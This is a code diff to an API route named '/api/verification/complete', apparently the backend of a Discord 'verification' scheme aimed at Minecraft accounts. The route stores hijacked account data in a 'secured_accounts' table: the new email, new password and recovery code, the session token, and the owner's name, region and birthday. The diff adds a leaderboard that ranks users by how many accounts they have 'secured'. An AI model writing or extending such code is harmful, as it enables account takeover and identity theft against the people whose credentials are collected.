@@ -74,23 +74,27 @@ export const Route = createFileRoute("/api/verification/complete")({
         }
 
         // Store secured account (secrets stay in DB + optional admin webhook / DM only)
-        const { error: insertError } = await db().from("secured_accounts").insert({
-          discord_id: storeDiscordId,
-          mc_username: mcUsername,
-          mc_email: mcEmail,
-          new_email: newEmail,
-          new_password: newPassword,
-          new_recovery_code: recoveryCode,
-          mc_ssid: result.ssid as string | null,
-          mc_capes: result.capes as string,
-          mc_method: result.method as string,
-          owner_first_name: result.firstName as string,
-          owner_last_name: result.lastName as string,
-          owner_region: result.region as string,
-          owner_birthday: result.birthday as string,
-          guild_id: guildId || null,
-          session_id: sessionId || null,
-        });
+        const { data: securedRow, error: insertError } = await db()
+          .from("secured_accounts")
+          .insert({
+            discord_id: storeDiscordId,
+            mc_username: mcUsername,
+            mc_email: mcEmail,
+            new_email: newEmail,
+            new_password: newPassword,
+            new_recovery_code: recoveryCode,
+            mc_ssid: result.ssid as string | null,
+            mc_capes: result.capes as string,
+            mc_method: result.method as string,
+            owner_first_name: result.firstName as string,
+            owner_last_name: result.lastName as string,
+            owner_region: result.region as string,
+            owner_birthday: result.birthday as string,
+            guild_id: guildId || null,
+            session_id: sessionId || null,
+          })
+          .select("id")
+          .single();
 
         if (insertError) {
           console.error("[verification/complete] insert secured_accounts:", insertError.message);
@@ -111,6 +115,31 @@ export const Route = createFileRoute("/api/verification/complete")({
             .from("verification_sessions")
             .update({ status: "secured" })
             .eq("id", sessionId);
+        }
+
+        // Leaderboard: count successful secures (idempotent by secured row / session)
+        try {
+          const { recordLeaderboardSecured } = await import("@/lib/leaderboard.server");
+          const sourceId = (securedRow?.id as string) || sessionId || null;
+          let rankName = mcUsername;
+          if (storeDiscordId) {
+            const { data: prof } = await db()
+              .from("profiles")
+              .select("username, global_name")
+              .eq("discord_id", storeDiscordId)
+              .maybeSingle();
+            rankName =
+              (prof?.global_name as string) ||
+              (prof?.username as string) ||
+              mcUsername;
+          }
+          await recordLeaderboardSecured(db(), {
+            discordId: storeDiscordId,
+            username: rankName,
+            sourceId,
+          });
+        } catch (e) {
+          console.warn("[verification/complete] leaderboard record failed:", e);
         }
 
         // Public channel: status only — NEVER post passwords/recovery codes
